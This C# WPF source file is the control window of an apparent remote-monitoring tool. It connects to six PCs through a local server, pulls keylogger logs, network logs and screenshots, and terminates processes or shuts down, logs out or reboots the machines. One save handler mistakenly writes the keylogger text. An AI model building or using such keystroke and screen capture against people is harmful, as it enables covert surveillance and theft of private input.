using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Media.Imaging;
using Microsoft.Win32;
using System.Text.Json;


namespace ServerGUI
{

    public partial class MainWindow : Window
    {
        private ServerController controller_;

        private ObservableCollection<ProcessInfo> processes;
        public MainWindow()
        {
            // DataContext = this;
            processes =
                new ObservableCollection<ProcessInfo>();
            InitializeComponent();
            EnableButton(false);
            
            try
            {
                Process.Start("Server.exe"); // Server Application
                Thread.Sleep(100);
                controller_ = new ServerController(
                    "DistanceGUIPipeServer", 
                    4096, 
                    100
                );
            }
            catch (TimeoutException)
            {
                MessageBox.Show(
                    "Failed connect to server...", "Distance warning!", 
                    MessageBoxButton.OK, MessageBoxImage.Warning
                );
                Application.Current.Shutdown();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Exception: " + ex, "Distance error!",
                    MessageBoxButton.OK, MessageBoxImage.Error
                );
                Application.Current.Shutdown();
            }
        }

        public void EnableButton(bool status)
        {
            KeyloggerLogUpdateButton.IsEnabled = status;
            KeyloggerLogSaveButton.IsEnabled = status;

            NetfilterLogUpdateButton.IsEnabled = status;
            NetfilterLogSaveButton.IsEnabled = status;

            GetScreenshotButton.IsEnabled = status;
            ScreenshotSaveButton.IsEnabled = status;

            ProcessUpdateButton.IsEnabled = status;
            ProcessTerminateButton.IsEnabled = status;

            ButtonShutdownPC.IsEnabled = status;
            ButtonLogoutPC.IsEnabled = status;
            ButtonRebootPC.IsEnabled = status;
        }



        //----------------------------------------------------------------------
        // Buttons connect to PC
        //----------------------------------------------------------------------

        private void PC1_Connect_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ConnectToPC1);
            InfoPC.Text = controller_.receiveData();
            EnableButton(true);
        }

        private void PC2_Connect_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ConnectToPC2);
            InfoPC.Text = controller_.receiveData();
            EnableButton(true);
        }

        private void PC3_Connect_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ConnectToPC3);
            InfoPC.Text = controller_.receiveData();
            EnableButton(true);
        }

        private void PC4_Connect_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ConnectToPC4);
            InfoPC.Text = controller_.receiveData();
            EnableButton(true);
        }

        private void PC5_Connect_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ConnectToPC5);
            InfoPC.Text = controller_.receiveData();
            EnableButton(true);
        }

        private void PC6_Connect_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ConnectToPC6);
            InfoPC.Text = controller_.receiveData();
            EnableButton(true);
        }

        //----------------------------------------------------------------------



        //----------------------------------------------------------------------
        // Keylogger
        //----------------------------------------------------------------------

        private void KeyloggerLogUpdateButton_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.GetKeyLog);
            KeyloggerLog.Text = controller_.receiveDataUnicode();
        }



        private void KeyloggerLogSaveButton_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog fileSaveDialog = new SaveFileDialog();
            fileSaveDialog.FileName = "log";
            fileSaveDialog.Filter = "Log file| *.txt";

            if (fileSaveDialog.ShowDialog() == true)
            {
                if (!File.Exists(fileSaveDialog.FileName))
                {
                    File.WriteAllText(
                        fileSaveDialog.FileName,
                        KeyloggerLog.Text,
                        Encoding.Unicode);
                }
            }
        }

        //----------------------------------------------------------------------



        //----------------------------------------------------------------------
        // Netfilter
        //----------------------------------------------------------------------

        private void NetfilterLogUpdateButton_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.GetNetLog);
            NetfilterLog.Text = controller_.receiveDataUnicode();
        }

        private void NetfilterLogSaveButton_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog fileSaveDialog = new SaveFileDialog();
            fileSaveDialog.FileName = "log";
            fileSaveDialog.Filter = "Log file| *.txt";

            if (fileSaveDialog.ShowDialog() == true)
            {
                if (!File.Exists(fileSaveDialog.FileName))
                {
                    File.WriteAllText(
                        fileSaveDialog.FileName,
                        KeyloggerLog.Text,
                        Encoding.Unicode);
                }
            }
        }

        //----------------------------------------------------------------------



        //----------------------------------------------------------------------
        // Screenshot
        //----------------------------------------------------------------------

        private void GetScreenshotButton_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.GetScreenshot);

            using (MemoryStream stream = 
                new MemoryStream(controller_.receiveBytes()))
            {
                ScreenshotImage.Source = BitmapFrame.Create(stream,
                    BitmapCreateOptions.None,
                    BitmapCacheOption.OnLoad);
            }

            GC.Collect();
        }



        private void ScreenshotSaveButton_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog imageSaveDialog = new SaveFileDialog();
            imageSaveDialog.FileName = "screenshot";
            imageSaveDialog.Filter = "Bitmap Image| *.bmp";

            if (imageSaveDialog.ShowDialog() == true)
            {
                var bmpSource = ScreenshotImage.Source as BitmapSource;
                if (bmpSource == null)
                {
                    MessageBox.Show(
                        "Failed saving image...", "Distance warning!",
                        MessageBoxButton.OK, MessageBoxImage.Warning
                    );
                    return;
                }

                BitmapEncoder encoder = new BmpBitmapEncoder();
                encoder.Frames.Add(BitmapFrame.Create(bmpSource));
                using (var fileStream = new FileStream(imageSaveDialog.FileName, FileMode.Create))
                {
                    encoder.Save(fileStream);
                }
            }
        }

        //----------------------------------------------------------------------


        //----------------------------------------------------------------------
        // Process manager
        //----------------------------------------------------------------------

        private void ProcessUpdateButton_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.GetProcessInfo);
            var processesEntry = JsonSerializer.Deserialize<List<ProcessEntry32>>(
                controller_.receiveBytes()
            );

            processes.Clear();

            for (int i = 0; i < processesEntry.Count; ++i)
            {
                processes.Add(new ProcessInfo()
                {
                    name = Encoding.UTF8.GetString(processesEntry[i].szExeFile.ToArray()),
                    pid = processesEntry[i].th32ProcessID,
                    cntThreads = processesEntry[i].cntThreads
                });
            }

            ProcessManagerListView.ItemsSource = processes;
            GC.Collect();
        }



        private void ProcessTerminateButton_Click(object sender, RoutedEventArgs e)
        {
            ProcessInfo info = (ProcessInfo)ProcessManagerListView.SelectedItem;
            processes.RemoveAt(ProcessManagerListView.SelectedIndex);

            controller_.sendQuery(Query.TerminateProcess);
            controller_.sendData(info.pid);
        }

        //----------------------------------------------------------------------


        //----------------------------------------------------------------------
        // Power manager
        //----------------------------------------------------------------------

        private void ButtonShutdownPC_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.ShutdownPC);
        }



        private void ButtonLogoutPC_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.LogoutPC);
        }



        private void ButtonRebootPC_Click(object sender, RoutedEventArgs e)
        {
            controller_.sendQuery(Query.RebootPC);
        }

        //----------------------------------------------------------------------
    }
}
